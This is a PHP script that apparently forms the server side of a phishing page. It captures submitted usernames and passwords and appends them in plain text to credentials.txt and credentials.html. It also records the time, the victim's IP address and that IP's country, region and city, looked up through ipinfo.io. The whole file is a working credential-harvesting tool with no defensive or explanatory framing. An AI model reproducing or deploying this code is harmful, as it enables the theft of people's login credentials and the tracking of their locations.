<?php
    
//Timezone
    date_default_timezone_set("America/Los_Angeles");
     
//Username
    if(isset($_POST['username']))
    {
    $un=$_POST['username'];
    $fp0 = fopen('credentials.txt', 'a');
    fwrite($fp0, "\n\n\nUsername is: " . $un . "\n");
    fclose($fp0);


    $un=$_POST['username'];
    $fp1 = fopen('credentials.html', 'a');
    fwrite($fp1, "\n            <div id='container'> \n                <table>\n                        <tr>\n                            <td>Username: " . $un . "\n                            </td>\n                        </tr>\n");
    fclose($fp1);
    }
    
//Password
    if(isset($_POST['password']))
    {
    $pw=$_POST['password'];
    $fp0 = fopen('credentials.txt', 'a');
    fwrite($fp0, 'Password is: ' . $pw . "\n");
    fclose($fp0);


    $pw=$_POST['password'];
    $fp1 = fopen('credentials.html', 'a');
    fwrite($fp1, "                        <tr>\n                            <td>Password: " . $pw . "\n                            </td>\n                        </tr>\n");
    fclose($fp1);
    }
    
//Date and Time
    $time = date("h:i:sa");
    $date = date("m/d/Y");
    $fp0 = fopen('credentials.txt', 'a');
    fwrite($fp0, 'Date and Time: ' . $date . " " . $time . "\n");
    fclose($fp0);



    $fp1 = fopen('credentials.html', 'a');
    fwrite($fp1, "                        <tr>\n                            <td>Date and Time: " . $date . " " . $time . "\n                            </td>\n                        </tr>\n");
    fclose($fp1);
    
//Gathering IP and GeoLo
    function get_client_ip()
    {
        $ipaddress = '';
        if (isset($_SERVER['HTTP_CLIENT_IP'])) {
            $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
        } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
            $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
        } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
            $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
        } else if (isset($_SERVER['HTTP_FORWARDED'])) {
            $ipaddress = $_SERVER['HTTP_FORWARDED'];
        } else if (isset($_SERVER['REMOTE_ADDR'])) {
            $ipaddress = $_SERVER['REMOTE_ADDR'];
        } else {
            $ipaddress = 'UNKNOWN';
        }
    
        return $ipaddress;
    }
    $PublicIP = get_client_ip();
    $json     = file_get_contents("http://ipinfo.io/$PublicIP/geo");
    $json     = json_decode($json, true);
    $country  = $json['country'];
    $region   = $json['region'];
    $city     = $json['city'];
    
//Saving IP and GeoLo
    $fp0 = fopen('credentials.txt', 'a');
    fwrite($fp0, 'IP is: ' . $PublicIP . "\n");
    fclose($fp0);
    
    $fp0 = fopen('credentials.txt', 'a');
    fwrite($fp0, 'Country is: ' . $country . "\n");
    fclose($fp0);
    
    $fp0 = fopen('credentials.txt', 'a');
    fwrite($fp0, 'Region is: ' . $region . "\n");
    fclose($fp0);
    
    $fp0 = fopen('credentials.txt', 'a');
    fwrite($fp0, 'City is: ' . $city . "\n");
    fclose($fp0);


    $fp1 = fopen('credentials.html', 'a');
    fwrite($fp1, "                        <tr>\n                            <td>IP: " . $PublicIP . "\n                            </td>\n                        </tr>\n");
    fclose($fp1);
    
    $fp1 = fopen('credentials.html', 'a');
    fwrite($fp1, "                        <tr>\n                            <td>Country: " . $country . "\n                            </td>\n                        </tr>\n");
    fclose($fp1);
    
    $fp1 = fopen('credentials.html', 'a');
    fwrite($fp1, "                        <tr>\n                            <td>Region: " . $region . "\n                            </td>\n                        </tr>\n");
    fclose($fp1);
    
    $fp1 = fopen('credentials.html', 'a');
    fwrite($fp1, "                        <tr>\n                            <td>City: " . $city . "\n                            </td>\n                        </tr>\n                </table>\n            </div>");
    fclose($fp1);

?>